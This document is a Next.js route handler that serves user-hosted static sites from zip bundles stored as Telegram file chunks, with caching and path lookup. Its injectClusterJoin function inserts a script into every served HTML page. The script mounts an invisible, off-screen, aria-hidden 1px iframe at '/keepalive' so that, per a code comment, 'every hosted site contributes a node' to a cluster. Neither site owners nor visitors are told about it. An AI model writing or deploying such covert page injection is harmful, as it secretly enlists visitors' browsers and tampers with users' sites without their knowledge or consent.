import { NextResponse } from 'next/server';
import AdmZip from 'adm-zip';
import { adminDb } from '@/app/api/user/_util';
import { requireTelegramBotToken, telegramDownloadFileBytes } from '@/lib/server/telegram';
import { FieldValue } from 'firebase-admin/firestore';

export const runtime = 'nodejs';
export const dynamic = 'force-dynamic';

type SiteRecord = {
  ownerUid: string;
  domain: string;
  bundleFileId: string; // Telegram manifest file_id (from /api/telegram/manifest)
  createdAt: number;
};

type TelegramManifest = {
  totalChunks?: number;
  chunks?: Array<{ index: number; telegramFileId: string }>;
};

// Best-effort in-memory caches to avoid re-downloading from Telegram on every request.
// (Works well on warm serverless instances; harmless on cold starts.)
const MANIFEST_TTL_MS = 2 * 60_000;
const ZIP_TTL_MS = 2 * 60_000;
const MAX_ZIP_CACHE_ITEMS = 8;

const manifestCache = new Map<string, { expiresAt: number; manifest: TelegramManifest }>();
const zipCache = new Map<string, { expiresAt: number; zip: AdmZip }>(); // key: manifestFileId

function pruneCaches() {
  const now = Date.now();
  for (const [k, v] of manifestCache) if (v.expiresAt <= now) manifestCache.delete(k);
  for (const [k, v] of zipCache) if (v.expiresAt <= now) zipCache.delete(k);

  // Simple FIFO eviction to cap memory.
  while (zipCache.size > MAX_ZIP_CACHE_ITEMS) {
    const firstKey = zipCache.keys().next().value as string | undefined;
    if (!firstKey) break;
    zipCache.delete(firstKey);
  }
}

function contentTypeFor(pathname: string): string {
  const p = pathname.toLowerCase();
  if (p.endsWith('.html')) return 'text/html; charset=utf-8';
  if (p.endsWith('.css')) return 'text/css; charset=utf-8';
  if (p.endsWith('.js')) return 'text/javascript; charset=utf-8';
  if (p.endsWith('.json')) return 'application/json; charset=utf-8';
  if (p.endsWith('.png')) return 'image/png';
  if (p.endsWith('.jpg') || p.endsWith('.jpeg')) return 'image/jpeg';
  if (p.endsWith('.svg')) return 'image/svg+xml; charset=utf-8';
  if (p.endsWith('.ico')) return 'image/x-icon';
  return 'application/octet-stream';
}

function injectClusterJoin(html: string): string {
  const snippet =
    `<script>(function(){try{if(window.__bellum_cluster_joined)return;window.__bellum_cluster_joined=true;` +
    `var mount=function(){try{var d=document;var b=d.body||d.documentElement;if(!b)return;` +
    `var i=d.createElement('iframe');i.src='/keepalive';i.tabIndex=-1;i.setAttribute('aria-hidden','true');` +
    `i.style.position='fixed';i.style.left='-9999px';i.style.top='-9999px';i.style.width='1px';i.style.height='1px';` +
    `i.style.opacity='0';i.style.pointerEvents='none';i.style.border='0';b.appendChild(i);}catch(e){}};` +
    `if('requestIdleCallback'in window)requestIdleCallback(mount,{timeout:2000});else setTimeout(mount,250);}catch(e){}})();</script>`;

  // Inject before </body> when possible.
  const idx = html.toLowerCase().lastIndexOf('</body>');
  if (idx >= 0) return html.slice(0, idx) + snippet + html.slice(idx);
  return html + snippet;
}

async function downloadTelegramManifest(origin: string, fileId: string): Promise<any> {
  pruneCaches();
  const cached = manifestCache.get(fileId);
  if (cached && cached.expiresAt > Date.now()) return cached.manifest;

  const token = requireTelegramBotToken();
  const bytes = await telegramDownloadFileBytes({ token, fileId });
  const text = new TextDecoder().decode(bytes);
  const manifest = JSON.parse(text) as TelegramManifest;
  manifestCache.set(fileId, { manifest, expiresAt: Date.now() + MANIFEST_TTL_MS });
  return manifest;
}

async function downloadTelegramFile(origin: string, fileId: string): Promise<Uint8Array> {
  void origin;
  const token = requireTelegramBotToken();
  return await telegramDownloadFileBytes({ token, fileId });
}

async function mapLimit<T, R>(items: T[], limit: number, fn: (item: T, idx: number) => Promise<R>): Promise<R[]> {
  const out: R[] = new Array(items.length) as any;
  let next = 0;
  const workers = new Array(Math.max(1, Math.min(limit, items.length))).fill(0).map(async () => {
    while (next < items.length) {
      const i = next++;
      out[i] = await fn(items[i], i);
    }
  });
  await Promise.all(workers);
  return out;
}

async function downloadBundleZipBytes(origin: string, manifestFileId: string): Promise<Uint8Array> {
  pruneCaches();

  const manifest = await downloadTelegramManifest(origin, manifestFileId);
  const chunks: Array<{ index: number; telegramFileId: string }> = Array.isArray(manifest?.chunks)
    ? manifest.chunks.map((c: any) => ({ index: Number(c.index), telegramFileId: String(c.telegramFileId) }))
    : [];
  const totalChunks = typeof manifest?.totalChunks === 'number' ? manifest.totalChunks : chunks.length;
  if (!totalChunks) throw new Error('Invalid manifest (no chunks)');

  const byIndex = new Array<string>(totalChunks);
  for (let i = 0; i < totalChunks; i++) byIndex[i] = '';
  for (const c of chunks) {
    if (Number.isFinite(c.index) && c.index >= 0 && c.index < totalChunks) byIndex[c.index] = String(c.telegramFileId || '');
  }
  for (let i = 0; i < totalChunks; i++) {
    if (!byIndex[i]) throw new Error(`Missing chunk fileId for index ${i}`);
  }

  // Pull chunks in parallel (bounded) for higher throughput on low-end / high-latency connections.
  const parts = await mapLimit(byIndex, 4, async (fid) => downloadTelegramFile(origin, fid));
  let total = 0;
  for (const p of parts) total += p.byteLength;
  const out = new Uint8Array(total);
  let off = 0;
  for (const p of parts) {
    out.set(p, off);
    off += p.byteLength;
  }
  return out;
}

export async function GET(req: Request, ctx: { params: { siteId: string; path?: string[] } }) {
  try {
    const siteId = String(ctx.params.siteId || '');
    if (!siteId) return NextResponse.json({ error: 'missing_siteId' }, { status: 400 });

    const db = adminDb();
    const siteRef = db.collection('xfabric_sites').doc(siteId);
    const snap = await siteRef.get();
    if (!snap.exists) return NextResponse.json({ error: 'not_found' }, { status: 404 });
    const site = snap.data() as SiteRecord;
    if (!site?.bundleFileId) return NextResponse.json({ error: 'invalid_site' }, { status: 500 });

    // Best-effort analytics (do not block serving on failures).
    void siteRef
      .set(
        {
          stats: {
            totalRequests: FieldValue.increment(1),
            lastRequestAt: Date.now(),
          },
        },
        { merge: true },
      )
      .catch(() => {});

    const origin = new URL(req.url).origin;
    pruneCaches();
    const now = Date.now();
    const cachedZip = zipCache.get(site.bundleFileId);

    const requested = (ctx.params.path && ctx.params.path.length ? ctx.params.path.join('/') : 'index.html')
      .replace(/^\/+/, '')
      .replace(/\.\./g, '');

    let zipFinal: AdmZip;
    if (cachedZip && cachedZip.expiresAt > now) {
      zipFinal = cachedZip.zip;
    } else {
      const zipBytes = await downloadBundleZipBytes(origin, site.bundleFileId);
      zipFinal = new AdmZip(Buffer.from(zipBytes));
      zipCache.set(site.bundleFileId, { zip: zipFinal, expiresAt: Date.now() + ZIP_TTL_MS });
      pruneCaches();
    }

    const entry =
      zipFinal.getEntry(requested) || (requested === 'index.html' ? null : zipFinal.getEntry('index.html'));

    if (!entry) return NextResponse.json({ error: 'file_not_found' }, { status: 404 });

    const buf = entry.getData(); // Buffer
    // Ensure ArrayBuffer-backed payload (BlobPart typings exclude SharedArrayBuffer/Buffer).
    const bytes = new Uint8Array(buf.byteLength);
    bytes.set(buf);
    const ct = contentTypeFor(entry.entryName);

    // Inject cluster join into served HTML so every hosted site contributes a node.
    if (ct.startsWith('text/html')) {
      const text = new TextDecoder().decode(bytes);
      const injected = injectClusterJoin(text);
      const outBytes = new TextEncoder().encode(injected);
      const blob = new Blob([outBytes.buffer]);
      return new Response(blob, {
        status: 200,
        headers: {
          'Content-Type': ct,
          'Cache-Control': 'public, max-age=0, must-revalidate',
        },
      });
    }

    const blob = new Blob([bytes.buffer]);

    // HTML should revalidate quickly; assets can be cached a bit longer.
    const cacheControl = 'public, max-age=300';
    return new Response(blob, {
      status: 200,
      headers: {
        'Content-Type': ct,
        'Cache-Control': cacheControl,
      },
    });
  } catch (e: any) {
    return NextResponse.json({ error: e?.message || 'host_failed' }, { status: 500 });
  }
}

